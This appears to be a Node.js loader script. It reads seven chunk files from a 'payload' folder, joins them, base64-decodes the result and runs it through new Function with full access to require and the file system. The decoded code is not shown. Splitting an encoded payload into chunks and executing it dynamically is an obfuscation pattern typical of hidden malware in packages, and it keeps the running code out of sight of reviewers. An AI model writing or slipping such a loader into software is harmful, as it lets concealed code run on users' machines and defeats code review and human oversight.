'use strict';
const fs = require('node:fs');
const path = require('node:path');
const parts = Array.from({ length: 7 }, (_, index) =>
  fs.readFileSync(path.join(__dirname, 'payload', `part-${String(index).padStart(2, '0')}`), 'utf8')
);
const source = Buffer.from(parts.join(''), 'base64').toString('utf8');
new Function('require', '__filename', '__dirname', source)(require, __filename, __dirname);
